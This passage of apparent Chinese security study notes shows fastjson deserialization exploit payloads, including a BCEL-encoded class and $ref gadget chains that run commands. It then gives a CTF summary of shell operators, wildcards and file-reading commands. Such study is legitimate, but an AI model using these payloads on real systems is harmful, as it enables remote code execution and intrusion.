class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>根据包版本的不同payload会略有差异，有些包调用的可能就是org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>类路径需要根据实际情况而定，运行结果</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321175438078.png" alt="image-20240321175438078"></p><p>以上方法只针对于fj&lt;=1.2.36版本的情况，为什么呢？</p><p>下图为fj1.2.37中的key部分，发现已经没有了toString方法，之前对于JSON.parse和JSON.parseObject的payload都是通过将key设置为JSONObject对象来触发toString，进而依次调用该类的getter加载恶意代码，如果没有了toString，那么payload也就失去了作用</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322005147162.png" alt="image-20240322005147162"></p><h2 id="通过-ref进行调用">通过$ref进行调用</h2><p>接下来的测试我的fj换成了1.2.37</p><p><strong>什么是ref</strong></p><p>ref是fastjson特有的JSONPath语法，用来引用之前出现的对象</p><p><strong>什么是JSONPath</strong></p><p><a href="https://blog.csdn.net/itguangit/article/details/78764212">https://blog.csdn.net/itguangit/article/details/78764212</a></p><p>测试代码</p><p>RefTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTest</span><span class="params">(String test)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.test=test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BCEL_refTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;,\&quot;test\&quot;:\&quot;test\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[1].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[1].cmd&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里解释一下jsonpath在该payload里的作用，$[1]代表引用了当前数组的第二个变量，也就是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>.cmd代表获取该对象中cmd的值，相比于之前的payload，$ref主要是通过JSONPath的形式进行了对象和属性的调用，利用反射进行实例化，进而执行恶意方法。同样的，我们可以通过$ref调用上面说到的connection，进而触发他的get方法</p><p>测试代码：</p><p><strong>BCEL_refTest.java</strong></p><p>运行的时候报了两次错，应该是tomcat版本的问题，高版本加了waf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A\&quot;&#125;,&#123;\&quot;$ref\&quot;: \&quot;$[0].Connection\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span><span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[0].Connection&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><strong>运行结果</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322132610173.png" alt="image-20240322132610173"></p><p><strong>过程分析</strong></p><p><a href="https://blog.csdn.net/solitudi/article/details/120275526">https://blog.csdn.net/solitudi/article/details/120275526</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行总结</title>
      <link href="/posts/1837iuw8.html"/>
      <url>/posts/1837iuw8.html</url>
      
        <content type="html"><![CDATA[<h1>命令执行</h1><h2 id="ASCII码表完整版">ASCII码表完整版</h2><table><thead><tr><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th></tr></thead><tbody><tr><td>0</td><td>NUT</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>、</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>!</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>”</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>,</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>/</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>—</td><td>127</td><td>DEL</td></tr></tbody></table><h2 id="系统命令简介">系统命令简介</h2><p>系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\Windows\System32，下面将针对linux和win的系统命令做简单介绍。</p><h3 id="管道符">管道符</h3><p>在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">‘<span class="string">|’ 直接执行后面的语句</span></span><br><span class="line">‘<span class="string">||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span></span><br><span class="line">‘<span class="meta">&amp;’ 前面和后面命令都要执行，无论前面真假</span></span><br><span class="line"><span class="meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span></span><br><span class="line"></span><br><span class="line">linux：</span><br><span class="line">Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘<span class="meta">&amp;’ 作用相同</span></span><br></pre></td></tr></table></figure><h3 id="通配符">通配符</h3><p>在linux操作系统中支持如下两种通配符</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?   可代替任意一个字符</span><br><span class="line"><span class="bullet">*   </span>可代替0-任意个字符</span><br></pre></td></tr></table></figure><p><strong>例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若当前目录只存在一个名为flag的文件</span><br><span class="line"><span class="built_in">cat</span> flag &lt;==&gt; <span class="built_in">cat</span> fla?  &lt;==&gt;  <span class="built_in">cat</span> f*</span><br></pre></td></tr></table></figure><h3 id="重定向">重定向</h3><p>在linux操作系统中一共有&gt;和&gt;&gt;两个重定向符号</p><p><strong>1.&gt;符号</strong></p><p>用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt; <span class="keyword">file</span>.txt    //将<span class="keyword">ls</span>的执行结果写入<span class="keyword">file</span>.txt中</span><br><span class="line">&gt;<span class="keyword">file</span>.txt        //创建名为<span class="keyword">file</span>.txt的文件</span><br></pre></td></tr></table></figure><p><strong>2.&gt;&gt;符号</strong></p><p>将命令的标准输出重定向到指定的文件，但与<code>&gt;</code> 不同的是，如果文件已经存在，<code>&gt;&gt;</code> 会将输出追加到文件末尾而不是覆盖文件内容。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt;&gt; <span class="keyword">file</span>.txt</span><br></pre></td></tr></table></figure><h3 id="常见系统命令">常见系统命令</h3><p>在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的</p><table><thead><tr><th style="text-align:center">system()</th></tr></thead><tbody><tr><td style="text-align:center">passthru()</td></tr><tr><td style="text-align:center">exec()</td></tr><tr><td style="text-align:center">shell_exec()</td></tr><tr><td style="text-align:center">popen()</td></tr><tr><td style="text-align:center">proc_open()</td></tr><tr><td style="text-align:center">pcntl_exec()</td></tr><tr><td style="text-align:center">``</td></tr></tbody></table><p>python中的例如等</p><table><thead><tr><th style="text-align:center">os.system()</th></tr></thead></table><p>根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整</p><h4 id="windows">windows</h4><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>ipconfig</td><td>主要用来查看当前机器内、外网ip</td></tr><tr><td>type</td><td>type filename 查看文件内容</td></tr><tr><td>cd</td><td>目录跳转</td></tr><tr><td>ping</td><td>ping ip或者url 主要用来判断某机器是否可达</td></tr><tr><td>dir</td><td>列出当前目录</td></tr><tr><td>whoami</td><td>查看当前用户，主要用于判断是否可以命令执行</td></tr></tbody></table><h4 id="linux">linux</h4><p><strong>基础命令</strong></p><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>ls</td><td>列出当前目录</td></tr><tr><td>cd</td><td>目录跳转</td></tr><tr><td>rm</td><td>删除</td></tr><tr><td>mv</td><td>重命名</td></tr><tr><td>whoami</td><td>查看当前用户</td></tr><tr><td>uname -a</td><td>列出内核版本等详细系统讯息</td></tr><tr><td>ifconfig</td><td>查看当前机器内外网ip</td></tr><tr><td>ping</td><td>判断目标机器是否可达</td></tr><tr><td>touch</td><td>创建文件</td></tr><tr><td>mkdir</td><td>创建目录</td></tr></tbody></table><p>在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的<strong>文件读取命令</strong></p><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>cat</td><td>文件读取</td></tr><tr><td>tac</td><td>文件读取（行倒序输出）</td></tr><tr><td>more</td><td>文件读取（一页一页显示）</td></tr><tr><td>less</td><td>文件读取（一页一页显示，可翻页）</td></tr><tr><td>head</td><td>文件读取（显示头几行）</td></tr><tr><td>tail</td><td>文件读取（显示最后几行）</td></tr><tr><td>nl</td><td>文件读取（会输出行号）</td></tr><tr><td>vim/vi</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>nano</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>emacs</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>sed -n ‘1,10p’</td><td>文件读取（显示前10行）</td></tr><tr><td>rev</td><td>文件读取（倒序输出）</td></tr><tr><td>base64</td><td>文件读取（以base64形式输出）</td></tr><tr><td>strings</td><td>文件读取（提取文件中可输出的字符串）</td></tr><tr><td>xxd</td><td>文件读取（二进制形式输出）</td></tr><tr><td>hexdump</td><td>文件读取（16进制形式输出）</td></tr><tr><td>od</td><td>文件读取（8进制形式输出）</td></tr><tr><td>uniq</td><td>文件读取（会去掉重复行）</td></tr><tr><td>cp</td><td>文件复制（可用于突破目标文件权限限制）</td></tr></tbody></table><h4 id="其它命令">其它命令</h4><p>除了以上的常见命令外还有其它的一些常用命令</p><h5 id="find"><strong>find</strong></h5><p>常用于在linux系统中查找某文件（支持通配符）的具体位置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name flag</span><br><span class="line"><span class="built_in">find</span> / -name f*</span><br><span class="line"><span class="built_in">find</span> / -name fla?</span><br><span class="line">/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件</span><br></pre></td></tr></table></figure><h5 id="sed"><strong>sed</strong></h5><p>在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实现格式为：</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;行数s/原内容/替换为的内容/&#x27;</span> 文件名</span><br><span class="line"></span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;2s/x\.x\.x\.x/150.158.24.228/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;3s/7002/7000/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;4s/.*//&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>PS：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.该命令支持通配符</span><br><span class="line"><span class="attribute">2</span>.该命令对于特殊符号需要用\进行转义，如上述的例<span class="number">1</span>中的.</span><br></pre></td></tr></table></figure><h5 id="echo"><strong>echo</strong></h5><p>如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">实现格式为：</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;base64编码的数据&#x27;</span> | <span class="built_in">base64</span> -d &gt; filename</span><br></pre></td></tr></table></figure><h2 id="二、命令执行">二、命令执行</h2><h3 